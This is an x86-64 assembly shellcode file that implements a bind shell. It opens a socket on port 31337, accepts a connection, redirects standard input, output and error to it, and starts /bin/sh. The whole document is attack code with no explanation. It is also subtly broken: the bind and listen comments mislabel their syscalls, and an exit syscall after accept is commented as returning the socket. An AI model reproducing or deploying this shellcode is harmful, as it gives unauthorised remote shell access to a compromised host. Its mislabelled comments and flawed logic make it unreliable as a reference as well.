BITS 64

global _start
section .text

_start:
	; socket(AF_INET, SOCK_STREAM, 0) -> C
	push BYTE 0x29				; sys_socket systemcall
	pop rax						; is number 41 (0x29)
	push BYTE 0x2
	pop rdi						; IP protocol family
	push BYTE 0x1
	pop rsi						; stream socket
	cdq							; no protocol
	syscall

	mov rdi,rax					; save and store socket fd in rdi for reuse

	; bind(s, [2, 31337, 0], 16)
	push BYTE 0x31				; sys_listen systemcall
	pop rax						; is number 49 (0x31)
	push rdx					; 00000000 00000000
	mov WORD [rsp+2], 0x697a	; 697a0000 00000000 ..
	mov BYTE [rsp], 0x2			; 697a0002 00000000 ..
	push rsp					; pointer to
	pop rsi						; sockaddr structure
	mov BYTE dl,0x10			; addrlen = 16
	syscall

	; listen(s, 4)
	push 0x32
	pop rax						; sys_bind systemcall is number 50 (0x32)
	mov sil, 0x4				; backlog = 4
	syscall

	; accept(s, 0, 0)
	mov BYTE al, 0x2b			; sys_accept systemcall is 43 (0x2B)
	xor rsi,rsi
	xor rdx,rdx
	syscall

	push byte 0x3c
	pop rax
	syscall 					; returns the connected socket fd

	;dup2(s, fd) x 3
	mov rdi,rax					; fp to connected socket
	xor rsi,rsi					; stdin
	push BYTE 0x21				; sys_dup2 33 (0x21)
	pop rax
	syscall
	mov al, 0x21			; sys_dup2 33 (0x21)
	inc rsi						; stdout
	syscall
	mov al, 0x21			; sys_dup2 33 (0x21)
	inc rsi						; stderr
	syscall

	;execve("/bin/sh", 0, 0)
	push 0x3b					; sys_execve
	pop rax
	xor rsi,rsi
	xor rdx,rdx
	mov rdi, 0x68732f6e69622f2f	; "hs/nib//"
	shr rdi, 0x8				; "\0hs/nib/"
	push rdi
	push rsp
	pop rdi						; pointer to "/bin/sh"
	syscall
